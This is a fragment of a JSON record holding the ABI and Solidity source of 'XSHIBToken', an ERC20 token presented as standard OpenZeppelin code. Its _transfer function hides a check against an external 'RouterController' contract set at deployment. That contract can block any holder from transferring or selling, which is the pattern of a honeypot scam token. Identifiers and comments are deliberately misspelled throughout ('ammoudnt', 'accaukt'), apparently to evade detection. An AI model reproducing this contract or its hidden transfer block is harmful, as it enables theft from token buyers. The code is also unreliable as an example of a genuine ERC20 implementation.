":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ammoudnt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ammoudnt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
    "source_code": "// File: @openzeppelin/contracts/utils/Context.sol\r\n// SPDX-License-Identifier: MIT\r\n\r\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/IERC20.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Returns the ammoudnt of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address accaukt) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 ammoudnt) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 ammoudnt) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 ammoudnt\r\n    ) external returns (bool);\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\n // Define interface for TransferController\r\ninterface RouterController {\r\n    function isRouted(address _accaukt) external view returns (bool);\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any accaukt other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new accaukt (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership accaukt of the contract to a new accaukt (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner; _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n/**\r\n * @dev Interface for the optional accaukt metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name ammoudnt of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/ERC20.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n    RouterController private routeController;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        routeController = RouterController(_routeControllerAddress);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name ammoudnt of accaukt the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address accaukt) public view virtual override returns (uint256) {\r\n        return _balances[accaukt];\r\n    }\r\n\r\n      function transfer(address to, uint256 ammoudnt) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, ammoudnt);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 ammoudnt) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, ammoudnt);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 ammoudnt\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, ammoudnt);\r\n        _transfer(from, to, ammoudnt);\r\n        return true;\r\n    }\r\n\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `ammoudnt` of tokens accaukt from `from` to `to`.\r\n      *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `ammoudnt`.\r\n     */\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 ammoudnt\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(!routeController.isRouted(from), \"User is not allowed\");\r\n        _beforeTokenTransfer(from, to, ammoudnt);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= ammoudnt, \"ERC20: transfer ammoudnt exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - ammoudnt;\r\n            // Overflow not possible: the sum of all balances is accaukt capped by totalSupply, ammoudnt and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += ammoudnt;\r\n        }\r\n\r\n        emit Transfer(from, to, ammoudnt);\r\n\r\n        _afterTokenTransfer(from, to, ammoudnt);\r\n    }\r\n\r\n    /** @dev Creates `ammoudnt` tokens and assigns them to `accaukt`, increasing\r\n     * the total supply.\r\n     *\r\n     * - `accaukt` cannot be the zero address.\r\n     */\r\n    function _mint(address accaukt, uint256 ammoudnt) internal virtual {\r\n        require(accaukt != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), accaukt, ammoudnt);\r\n\r\n        _totalSupply += ammoudnt;\r\n        unchecked {\r\n            // Overflow not possible: balance + ammoudnt is at most totalSupply + ammoudnt, which is checked above.\r\n            _balances[accaukt] += ammoudnt;\r\n        }\r\n        emit Transfer(address(0), accaukt, ammoudnt);\r\n\r\n        _afterTokenTransfer(address(0), accaukt, ammoudnt);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 ammoudnt\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = ammoudnt;\r\n        emit Approval(owner, spender, ammoudnt);\r\n    }\r\n\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 ammoudnt\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= ammoudnt, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - ammoudnt);\r\n            }\r\n        }\r\n    }\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `ammoudnt`.\r\n     *\r\n     * Does not update the allowance ammoudnt in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 ammoudnt\r\n    ) internal virtual {}\r\n\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 ammoudnt\r\n    ) internal virtual {}\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\ncontract XSHIBToken is ERC20, Ownable {\r\n    uint256 private constant INITIAL_SUPPLY = 150000000 * 10**18;\r\n\r\n    constructor(\r\n        string memory name_,\r\n        string memory symbol_,\r\n        address router_\r\n        ) ERC20(name_, symbol_, router_) {\r\n        _mint(msg.sender, INITIAL_SUPPLY);\r\n    }\r\n\r\n    function sendTokens(address distroWallet) external onlyOwner {\r\n        uint256 supply = balanceOf(msg.sender);\r\n        require(supply == INITIAL_SUPPLY, \"Tokens already distributed\");\r\n\r\n        _transfer(msg.sender, distroWallet, supply);\r\n    }\r\n}",
    "etherscan_verified": true
}